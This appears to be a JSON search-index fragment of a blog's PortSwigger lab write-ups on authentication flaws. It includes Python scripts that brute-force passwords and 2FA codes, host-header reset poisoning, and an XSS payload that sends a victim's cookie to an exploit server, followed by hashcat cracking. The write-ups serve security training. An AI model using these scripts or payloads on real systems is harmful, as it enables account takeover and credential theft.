        "content": "Lab 12: Password brute-force via password change: This lab\u0026rsquo;s password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos\u0026rsquo;s account and access his \u0026ldquo;My account\u0026rdquo; page.\nYour credentials: wiener:peter Victim\u0026rsquo;s username: carlos Candidate passwords\nInitial Reconnaissance/Discovery: We have access to a simple web-application that allows us to login. Once logged in we can also change our password \u0026amp; email. Reviewing the Password Change Process: Let\u0026rsquo;s perform a password change and review the process whilst intercepting the traffic.\nAs we can see our username is sent as well as the current password, which is to be expected. Our password is then changed. Now you may be thinking this is an easy way to bruteforce this, we just replace the username with our target user \u0026ldquo;carlos\u0026rdquo; \u0026amp; then bruteforce the \u0026ldquo;current-password\u0026rdquo; field using the supplied wordlist until we change carlos\u0026rsquo; password…well it doesn\u0026rsquo;t work.\nLet\u0026rsquo;s keep working with this reset functionality until we can find a route forward.\nTest 1, enter incorrect current password: If we put in an incorrect current password and try a password reset as our user we just get a standard re-direct and no additional information is offered to us.\nTest 2, enter missmatched new passwords with correct current password: If we enter two different passwords for our new password and the correct current password we get the message \u0026ldquo;New passwords do not match\u0026rdquo;. Test 3, enter missmatched new passwords with incorrect current password: If we enter two different passwords for our new password and the incorrect current password we get the message \u0026ldquo;Current password is incorrect\u0026rdquo;. Using a combination of the test 2 \u0026amp; 3 we should be able to bruteforce carlos\u0026rsquo; password by doing the following:\nReplace the username with our target user \u0026ldquo;carlos\u0026rdquo;. Enter missmatched new passwords. Bruteforce the \u0026ldquo;current-password\u0026rdquo; field using the supplied wordlist. Grep for the response \u0026ldquo;New passwords do not match\u0026rdquo;. Bruteforcing Carlos\u0026rsquo; Password VIA Password Reset Form Using Burp: I will show how we can do this using Burp as well as how we can script this attack using python.\nWe send the request to intruder and make the below changes, adding carlos\u0026rsquo; name as the username and then setting the password field as our injection point and purposely entering missmatched passwords. We need to make a custom resource pool as if we don\u0026rsquo;t it will prevent us by limiting our requests out we can do this by clicking \u0026ldquo;Resource Pool\u0026rdquo; in intruder. We now need to set our grep search string to search for \u0026ldquo;New passwords do not match\u0026rdquo;. Once done we can begin the attack and we will see we get a match for the passwords soccer. We can then login \u0026amp; solve the lab. Bruteforcing Carlos\u0026rsquo; Password VIA Password Reset Form Using Python: Prep The Certificate: If you want to proxy traffic through burp this is mandatory.\nOpen burp\u0026rsquo;s in built web browser and go to http://burpsuite \u0026amp; download the certificate by clicking on “CA Certificate” button on the top right corner. Convert the certificate to the .pem format so the python requests module can use it.\nopenssl x509 -inform der -in certificate.cer -out certificate.pem Imports: First we import the modules we will need, requests \u0026amp; os. We also suppress the requests warning that will show.\nimport requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) If we didn\u0026rsquo;t suppress the warnings the output would look like this. Proxy Setup: Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.\nproxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; Variable Declaration: We declare an array of proxies to proxy our requests through as well as the unique url for our lab\u0026rsquo;s my-account page.\nWe are targeting the /my-account/change-password password.\nproxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0afc005e0431639f80fae533003e00d5.web-security-academy.net/my-account/change-password\u0026#34; Iterate Through Password List: We open the pass.txt file and read the contents. We then iterate through the file and take each line \u0026amp; pass it to the variable password whilst stripping the new line character from the end of it.\nwith open(\u0026#34;pass.txt\u0026#34;, \u0026#39;r\u0026#39;) as passes: for line in passes: password=(line.rstrip(\u0026#39;\\n\u0026#39;)) Bruteforcing Requests: We then send our requests ensuring the username is \u0026ldquo;carlos\u0026rdquo; \u0026amp; the current-password is set to be our password variable.\nWe also ensure our new-passwords missmatch.\nTo be able to call the my-account/change-password we need to be logged in, to do this we can login is our user and then copy their session cookie and pass that in our request.\ntry: request=requests.post(url, proxies=proxies, verify=False, timeout=3, data={ \u0026#39;username\u0026#39;: \u0026#39;carlos\u0026#39;, \u0026#39;current-password\u0026#39;: password, \u0026#39;new-password-1\u0026#39;: \u0026#39;test1\u0026#39;, \u0026#39;new-password-2\u0026#39;: \u0026#39;test2\u0026#39;, }, cookies={ \u0026#39;session\u0026#39;: \u0026#39;HXFGXY0xSaJEVJp3sJnhrgxKOLJOTiAR\u0026#39; }) String Matching: As we know that if we get the string \u0026ldquo;New passwords do not match\u0026rdquo; in a response we have found the current password we check if it is in the request response \u0026amp; then print out carlos\u0026rsquo; password to the terminal if so.\nif \u0026#39;New passwords do not match\u0026#39; in request.text: print(f\u0026#34;Carlos current password is {password}\u0026#34;) Error Handling: These except clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.\nexcept requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Full Script: #!/usr/bin/env python3 import requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0afc005e0431639f80fae533003e00d5.web-security-academy.net/my-account/change-password\u0026#34; with open(\u0026#34;pass.txt\u0026#34;, \u0026#39;r\u0026#39;) as passes: for line in passes: #Strip New line character from passwords password=(line.rstrip(\u0026#39;\\n\u0026#39;)) try: request=requests.post(url, proxies=proxies, verify=False, timeout=3, data={ \u0026#39;username\u0026#39;: \u0026#39;carlos\u0026#39;, \u0026#39;current-password\u0026#39;: password, \u0026#39;new-password-1\u0026#39;: \u0026#39;test1\u0026#39;, \u0026#39;new-password-2\u0026#39;: \u0026#39;test2\u0026#39;, }, cookies={ \u0026#39;session\u0026#39;: \u0026#39;HXFGXY0xSaJEVJp3sJnhrgxKOLJOTiAR\u0026#39; } ) if \u0026#39;New passwords do not match\u0026#39; in request.text: print(f\u0026#34;Carlos current password is {password}\u0026#34;) except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Script Execution: We now run our script with.\npython lab12.py As we can see we get a hit. And when we try and login we can And the lab is solved. Why This Is Vulnerable: As we saw the username for the password reset is being sent in the POST request, this means we can control this value and perform arbitrary password resets for other users; couple this with that we can infer when a password is correct based on the error messages we receive and bypass the bruteforce mitigation to easily bruteforce the users password.\n", 
        "url": "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_12\/"
    },

    "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_10\/": {
        "title": "Authentication Vulnerabilities: Lab 10: Password reset broken logic",
        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","authentication","login","username-enumeration","response-timing","portswigger-labs","xss","ctf-writeup","password-reset-poisoning",],
        "content": "Lab 10: Password reset broken logic: This lab\u0026rsquo;s password reset functionality is vulnerable. To solve the lab, reset Carlos\u0026rsquo;s password then log in and access his \u0026ldquo;My account\u0026rdquo; page.\nYour credentials: wiener:peter Victim\u0026rsquo;s username: carlos\nInitial Reconnaissance/Discovery: We have access to a web application with a \u0026ldquo;My account\u0026rdquo; section as well as an email client. Examining The Password Reset Process: As we know the password reset process is vulnerable, let\u0026rsquo;s go through this process to see how it work \u0026amp; look for where we can exploit it.\nLet\u0026rsquo;s navigate to the \u0026ldquo;My account\u0026rdquo; page where we can see the \u0026ldquo;Forgot password?\u0026rdquo; option. We are prompted for our username or email, we can enter the provided email client\u0026rsquo;s email. Once we hit submit we are told to check our email for the link. Checking our email we are provided the link. Looking at the page we are taken to we have a standard option of providing a new password \u0026amp; looking at the string value it does appear to randomly generated. Let\u0026rsquo;s put in a new password \u0026amp; copy the url. If we try and revisit the link again once submitted we can see the token is no longer valid and has been revoked. This is good from a security point of view as these tokens should be revoked once used. Examining the password reset POST request in burp we can see the username wiener is part of the request. Let\u0026rsquo;s initiate another reset but intercept the requests and modify the username to be \u0026ldquo;carlos\u0026rdquo; to see if that works.\nPerforming A Password Reset On Behalf Of Our Target User: First we initiate another password reset \u0026amp; click the link in the email client.\nWe turn intercept on in burp suite.\nWe then enter the password we want to use \u0026amp; submit the request. We can then modify the username that the password is being reset for to be carlos \u0026amp; forward the request on. If we try and login as \u0026ldquo;carlos\u0026rdquo; we can see it works and we solve the lab. Why This Is Vulnerable: When the token is issued it should have a mechanism that ensures that only the correct (user who initiated the request) user\u0026rsquo;s password can be changed and then the token should be destroyed/invalidated. We can see from our testing the token is invalid once a reset has taken place as checking the endpoint forgot-password?temp-forgot-password-token=[token] once a token is used will not work, however by intercepting the POST request we can change any users password.\n", 
        "url": "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_10\/"
    },
    
    "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_11\/": {
        "title": "Authentication Vulnerabilities: Lab 11: Password reset poisoning via middleware",
        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","authentication","login","username-enumeration","response-timing","portswigger-labs","xss","ctf-writeup","password-reset-poisoning","host-header-injection",],
        "content": "Lab 11: Password reset poisoning via middleware: This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos\u0026rsquo;s account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.\nInitial Reconnaissance/Discovery: As usual we have access to a basic web application which has a \u0026ldquo;My account\u0026rdquo; section. We can also access the exploit server as-well as the email client from the exploit server. Initiating The Password Reset Process: Let\u0026rsquo;s map the password reset process to see how we can exploit it.\nUnder \u0026ldquo;My account\u0026rdquo; we find the \u0026ldquo;Forgot Password?\u0026rdquo; link We can enter our email from the email client to reset our password. Checking our email client we can see we have received a link to reset the password.\nLooking at this specific request in burp it does not appear to contain anything that we could exploit directly. Password Reset Link Enuemration: Let\u0026rsquo;s trigger mulitiple password resets in succession to see if we can glean any information from the links generated. Looking at the links they do appear to be random as these were generated using the same method \u0026amp; name as opposed to email + name. This means (we already know due to the description of the lab) that the links are generated dynamically.\nHost Header Injection Bypass For Password Link Reset Poisoning: When we initiate a password reset we send a POST request to the endpoint /forgot-password with the username or email. As we only need the username we can initiate a password reset on behalf of another user, in this instance \u0026ldquo;carlos\u0026rdquo;.\nFirst we create a password reset for ourselves which we can then send the request to repeater. In repeater we will modify the username to be \u0026ldquo;carlos\u0026rdquo; we can then add the \u0026ldquo;X-Forwaded-Host\u0026rdquo; header \u0026amp; add our exploit server as the endpoint. Now going back to our exploit server if we check the logs we can see we have carlos\u0026rsquo; password reset token. We can then take this token \u0026amp; reset carlos\u0026rsquo; password. Once done we then login to solve the lab.\nWhy Does This Work: This attack only works as the application is using the X-Forwarded-Host header as a source when dynamically building the password reset urls.\nThe application needs to send carlos a password reset link like: https://vulnerable-website.com/forgot-password?token=XYZ When it builds the full URL it is doing it dynamically this means the server has to decide what the host part is (vulnerable-website.com) \u0026amp;, for some reason, instead of using a fixed value or the actual Host header, the application trusts the our supplied X-Forwarded-Host header and does something like the pseudo code below when constructing the reset link.\nhost = request.headers[\u0026#34;X-Forwarded-Host\u0026#34;] or request.headers[\u0026#34;Host\u0026#34;] reset_link = \u0026#34;https://\u0026#34; + host + \u0026#34;/forgot-password?token=\u0026#34; + token As we control the X-Forwarded-Host value we can supply our own exploit server \u0026amp; the application will blindly use the value when composing the link in the email meaning carlos receives. https://our-exploit-server-id.exploit-server.net/forgot-password?token=VICTIM_TOKEN which means when carlos clicks the link, his browser makes a request to our server, and the reset token appears in our exploit server access logs.\n+Note+: This took me a minute to figure out \u0026amp; the reason being is it\u0026rsquo;s not a technique I was/am overly familiar with but this attack requires injecting host override headers whilst password reset poisoning, below are some links that helped me understand the process more in depth.\nhttps://portswigger.net/web-security/host-header/exploiting#inject-host-override-headers https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning This also really helps understand why this works. ", 
        "url": "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_11\/"
    },
    
    "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_9\/": {
        "title": "Authentication Vulnerabilities: Lab 9: Offline password cracking after stealing user session cookie via xss",
        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","authentication","login","username-enumeration","response-timing","portswigger-labs","xss","cookie","ctf-writeup","python","hashcat","john","cracking","md5",],
        "content": "Lab 9: Offline password cracking: This lab stores the user\u0026rsquo;s password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos\u0026rsquo;s stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the \u0026ldquo;My account\u0026rdquo; page.\nYour credentials: wiener:peter Victim\u0026rsquo;s username: carlos\nInitial Reconnaissance/Discovery: As usual we have a simple web application and a \u0026ldquo;My account\u0026rdquo; page \u0026amp; access to the exploit server which we will send the stolen cookie too. Logging in to View Cookie: As we know we need to steal the user\u0026rsquo;s cookie value via an XSS vulnerability \u0026amp; we know the vulnerability is in the comment section, let\u0026rsquo;s first login as our user \u0026ldquo;wiener\u0026rdquo; \u0026amp; tick the \u0026ldquo;Stay logged in\u0026rdquo; box so we can determine the name of the cookie and its contents. Looking at the cookie in the inspector we can see the below we can see there are two cookies, the \u0026ldquo;stay-logged-in\u0026rdquo; cookie and the standard session cookie. As we can see the standard session cookie has the \u0026ldquo;secure\u0026rdquo; \u0026amp; \u0026ldquo;HttpOnly\u0026rdquo; flags set meaning that we cannot target it (we know this but it\u0026rsquo;s good to check)\nhttps://owasp.org/www-community/HttpOnly https://owasp.org/www-community/controls/SecureCookieAttribute Decoding The Base64 Encoded Cookie Contents: Looking at the cookie value we can take a guess and assume it\u0026rsquo;s a base64 encoded string, however if you are unsure you can always throw it in hashes.com echo \u0026#34;d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw\u0026#34; | base64 -d Now I know this is an MD5 hash from experience and also contextually as I have been doing these labs \u0026amp; MD5 has been the standard so far. However, I understand that may not be obvious for some readers so an easy way to identify the hash type is by using either https://hashes.com/en/tools/hash_identifier or hashid in kali.\nUsing hashid \u0026amp; hashes.com To Identify The Hash Type: hashid \u0026#34;51dc30ddc473d43a6011e9ebba6ca770\u0026#34; Now that output is pretty messy as it could be ANY of those right. Well we can also use online tools such as https://hashes.com/en/tools/hash_identifier Using md5sum to Encode our Password: We can also do a simple a check by hashing our password with md5sum and then checking it against the base64 encoded cookie value.\necho -n peter | md5sum | awk \u0026#39;{print $1}\u0026#39; As we can see it matches.\nWhy This Is Bad: This means our cookie value is \u0026ldquo;username:[hashed md5 password with no salt]\u0026rdquo; then this is encoded in base64…if you hadn\u0026rsquo;t guessed it this is really insecure, couple this with not using \u0026ldquo;HttpOnly\u0026rdquo; or \u0026ldquo;Secure\u0026rdquo; cookie values and you have a recipe for disaster.\nEnumerating The Stored XSS Vulnerability: We know there is a stored xxs vulnerability and looking at the articles we have the ability to leave a comment and include our name, email \u0026amp; website. Let\u0026rsquo;s enumerate what field(s) are vulnerable.\nWe can fill all injection points with the payload below \u0026amp; modify the string to include the field name so we can determine which field is vulnerable.\n\u0026lt;script\u0026gt;console.log(\u0026#34;xsstest [fieldname]:\u0026#34;location.origin\u0026lt;/script\u0026gt;) When we try and submit the payloads we get a popup regarding the format of the email address \u0026amp; website fields. It appears it\u0026rsquo;s parsing these field\u0026rsquo;s to ensure they have the correctly formatted strings in them. No way round. +Note+: We could use a work-around for these types of validations however for this lab it is unnecessary so we will just focus on the fields that are not validating our input.\nThis leaves us with the \u0026ldquo;Comment\u0026rdquo; \u0026amp; \u0026ldquo;Name\u0026rdquo; fields.\nWhen we submit these payloads they successful post. Now to validate our stored XSS we will ensure the console is open \u0026amp; reload the page. As we can see we get a hit for the comment section so we know there an xss vulnerability in the comment field.\nCrafting An XSS Payload To Steal The Users Cookie: Now we need to use our attack server to act as an endpoint to send carlos\u0026rsquo; cookie once the xss exploit retrieves it.\nWe can take the exploit server url \u0026amp; append place that in our payload so it becomes.\n\u0026lt;body onload=\u0026#34;fetch(\u0026#39;[explloitServerUrl\u0026#39;+document.cookie)\u0026#34;\u0026gt; We then submit this as a comment. Now when go back to the exploit server page we can check the \u0026ldquo;Access log\u0026rdquo; to see what has accessed the exploit server url. As we can see the exploit server has been accessed and it has the \u0026ldquo;stay-logged-in\u0026rdquo; cookie. +Note+: It also has the string \u0026ldquo;(Victim)\u0026rdquo; in the \u0026ldquo;user-agent\u0026rdquo; so that\u0026rsquo;s a dead giveaway.\nLet\u0026rsquo;s base64 decode it.\necho \u0026#34;Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz\u0026#34; | base64 -d As we can see it\u0026rsquo;s carlos\u0026rsquo; cookie! Cracking Carlos\u0026rsquo; Hash With Hashcat: Now we need to crack the hash so let\u0026rsquo;s put the hash in a file.\necho \u0026#34;26323c16d5f4dabff3bb136f2460a943\u0026#34; \u0026gt;\u0026gt; lab9.hash Now what you may notice is if we try and use the provided wordlist for this, the password will not be found. However there is a hint to why this is in the preceeding section:\nIn some rare cases, it may be possible to obtain a user\u0026rsquo;s actual password in cleartext from a cookie, even if it is hashed. Hashed versions of well-known password lists are available online, so if the user\u0026rsquo;s password appears in one of these lists, decrypting the hash can occasionally be as trivial as just pasting the hash into a search engine. This demonstrates the importance of salt in effective encryption.\nNow we could just paste this into hash into our search engine but that\u0026rsquo;s a bad idea on a real engagement so let\u0026rsquo;s use a well known password list, rockyou.txt.\n+Note+: rockyou.txt is available by default in kali, under /usr/share/wordlists/rockyou.txt.gz (it\u0026rsquo;s compressed compressed so you will need to decompress with gunzip rockyou.txt.gz /user/share/wordlists/rockyou.txt.gz\nWe can use hashcat to decrypt the password using hashcat.\nhashcat lab9.hash -m 0 /usr/share/wordlist/rockyou.txt As you can see we get a hit for onceuponatime Let\u0026rsquo;s login with these creds. As we can see we can login. Finally we delete carlos\u0026rsquo; account to solve the lab after we are prompted again to enter the password. Lab solved. ", 
        "url": "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_9\/"
    },

        "content": "Lab 7: 2FA broken logic: This lab\u0026rsquo;s two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos\u0026rsquo;s account page.\nYour credentials: wiener:peter Victim\u0026rsquo;s username: carlos\nYou also have access to the email server to receive your 2FA verification code.\nInitial Reconnaissance/Discovery: We have a standard login page as usual and access to an email server to receive our 2FA codes for our user.\nLet\u0026rsquo;s login to view the process.\nWe are now prompted for our 2FA code. Let\u0026rsquo;s get our 2FA code from the email client. We are now logged in. Breaking Down Authentication Flow: /login So we can see what is going on at the back end let\u0026rsquo;s break down the complete authentication flow by following it in burp.\nIf we look at our initial POST request of when we send our username \u0026amp; password we can see we get a 302 (redirect) to hit the endpoint /login2 and we can also see a cookie is set to the value of our username.\nSet-Cookie: verify=wiener /login2 Looking at the POST request for the endpoint /login2 where we supply our 2FA token we can see that we are passing the cookie with our name value, that was set previously, as well as the 2FA-code. Weakness in the logic: Looking at this authentication flow we should be able to send the second request to intruder and set the cookie value to the name of the user we want to login as \u0026ldquo;carlos\u0026rdquo;, once this is done we should be able to then brute force the 2FA code.\nExploiting Flawed Login Logic To Bruteforce A Valid 2FA Code: +Disclaimer+: So this took me a while to figure out as initially I just sent the POST request for /login2 to intruder and modified the cookie value to be \u0026ldquo;carlos\u0026rsquo;\u0026rdquo; name and bruteforced the 2FA code however this was not working; I was just getting standard 200 responses when I should of in-fact been getting 302 responses. This was when I realised \u0026ldquo;carlos\u0026rdquo; had not had a valid 2FA code issued. As we had not requested a 2FA code for \u0026ldquo;carlos\u0026rdquo; it would always fail as trying to bruteforce a value that doesn\u0026rsquo;t exist will never work. Instead what we need to do is trigger the website to generate an 2FA code for \u0026ldquo;carlos\u0026rsquo;\u0026rdquo; account and then bruteforce the 2FA code.\nRequesting A 2FA Code For Carlos: First let\u0026rsquo;s take the original GET request for /login2 and send this to repeater. Now we modify the cookie value to contain \u0026ldquo;carlos\u0026rsquo;\u0026rdquo; name and send it, this will cause the site to generate a 2FA code for \u0026ldquo;carlos\u0026rdquo;, which should be sent via email to him. Bruteforcing The 2FA Code Using Burp: Now we can bruteforce the code by taking our valid POST request for /login2 and sending it to intruder. We set the injection point to be the mfa-code value and also modify the cookie to contain \u0026ldquo;carlos\u0026rsquo;\u0026rdquo; name the value. For our payloads we can set the type as \u0026ldquo;number\u0026rdquo; and then set the values listed in the image, this ensures we step through every number from 0001 to 9999. +Note+: The \u0026ldquo;Numbers\u0026rdquo; option is only available on burp pro \u0026amp; iterating through 9999 possible combinations will take a long while if using a burp community edition, so we can also script this in python too, which I will show.\nOnce we start our attack we can set our status code filter so that 302\u0026rsquo;s are at the top and we get a hit, meaning we have a valid code of 0808. Bruteforcing The 2FA Code Using Python: As I said above doing this with the community edition of burp will take a LONG time as they purposely throttle the requests intruder can make. There are ways around this, such as copying the POST request and using FFUF to bruteforce whilst proxying through burp, or proxying ZAP through burp (which does not limit requests), or scripting this ourselves in python and proxying through burp.\nMy python has gotten a little rusty as of late as I had found myself becoming a bit too reliant on LLM models for scripting basic things, so I have stopped using LLM\u0026rsquo;s for this as I want ensure I stay sharp. (If you use LLM\u0026rsquo;s that\u0026rsquo;s fine but for me I found I was losing my edge) so brace yourself for some ugly, sloppy yet still functional code.\nPrep The Certificate: If you want to proxy traffic through burp this is mandatory.\nOpen burp\u0026rsquo;s in built web browser and go to http://burpsuite \u0026amp; download the certificate by clicking on “CA Certificate” button on the top right corner. Convert the certificate to the .pem format so the python requests module can use it.\nopenssl x509 -inform der -in certificate.cer -out certificate.pem Python 2FA Bruteforcer: import requests import os import time requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0afe00ec0370f1d6803adffc003c002f.web-security-academy.net/login2\u0026#34; cookies={\u0026#39;verify\u0026#39; : \u0026#39;carlos\u0026#39;, \u0026#39;session\u0026#39; : \u0026#39;Z1XthxXeEPetLSeXVTNQIEeRhZtuH2xv\u0026#39;} for i in range(9999): MFA=(f\u0026#39;{i:04}\u0026#39;) try: request=requests.post(url, proxies=proxies, cookies=cookies, verify=False, timeout=3, data={ \u0026#39;mfa-code\u0026#39;: MFA }) if request.status_code == 302: print(MFA) except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Code Breakdown: For all you nerds out there let\u0026rsquo;s break this down.\nImports:\nFirst we import the modules we will need, requests \u0026amp; os. We also suppress the requests warning that will show\nimport requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) If we didn\u0026rsquo;t suppress the warnings the output would look like this. Proxy Setup:\nNow we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.\nproxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; Variable Declaration:\nWe declare an array of proxies to pass to our requests to as well as the unique url for our lab\u0026rsquo;s login page as this is where we will be sending requests.\nCookies: We need to grab the cookie values from a valid request and change the name to be \u0026ldquo;carlos\u0026rdquo; as opposed to \u0026ldquo;wiener\u0026rdquo; +Note+: Ignore that the values for the session are different, I forgot to take a screenshot at the time of writing the code.\nproxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0afe00ec0370f1d6803adffc003c002f.web-security-academy.net/login2\u0026#34; cookies={\u0026#39;verify\u0026#39; : \u0026#39;carlos\u0026#39;, \u0026#39;session\u0026#39; : \u0026#39;Z1XthxXeEPetLSeXVTNQIEeRhZtuH2xv\u0026#39;} Main Logic:\nCreate A Simple Loop For 9999 Iterations:\nWe use the i in range syntax to iterate through 9999 iterations.\nMFA=(f'{i:04}'): We then set the value of the variable MFA to that of i but with three 0\u0026rsquo;s preceding it, we do this as if we didn\u0026rsquo;t we would just get numbers like 1 as opposed to 0001 and the format of the 2FA code is 4 digits. Some of you may have realised that this value we are creating is a string, however it doesn\u0026rsquo;t matter as we are passing it in the request body. we are passing it in the request body.\nWe then use a try/except block to send our request with the cookies, proxy details and mfa-code in the body.\nfor i in range(9999): MFA=(f\u0026#39;{i:04}\u0026#39;) try: request=requests.post(url, proxies=proxies, cookies=cookies, verify=False, timeout=3, data={ \u0026#39;mfa-code\u0026#39;: MFA }) Notify On Event Of 302 Response:\nThis should respond with just the MFA code in the console on the event a 302 is returned, however it just did not do it and I ended up filtering in burp.\nif request.status_code == 302: print(MFA) Error Handling:\nThese except clauses are used for error handling, which is needed as otherwise it can error out (see image below)\nexcept requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Here is the ConnectionError exception being triggered, this seemed to happen every 1500 requests or so. 2FA code found Via Manual 2FA Brutforcer: If we run the code we can see it works as we get a 302 response in burp, and that our 2FA code has a value of 1989.\n+Note+: I scripted this after I had already completed the lab so the discovered 2FA code is different to the one I found via burp.\nLogging In As Carlos: Now that we have our code we actually need to login as \u0026ldquo;carlos\u0026rdquo;. To do this we will need to intercept valid requests and modify them in transit.\nFirst we login as normal with our user \u0026ldquo;wiener\u0026rdquo; then when we get to the 2FA request we modify the cookie to contain \u0026ldquo;carlos\u0026rdquo; \u0026amp; we supply the 2FA token 0808. Now the important part after we modify the previous request and send it on we will we make our request for the /my-account?id=[username] endpoint. For this we need to ensure we set the cookie value again to \u0026ldquo;carlos\u0026rdquo; and the forward the request. Once done if we reload our page in our browser we can see we are logged in as \u0026ldquo;carlos\u0026rdquo; \u0026amp; we have solved the lab. ",
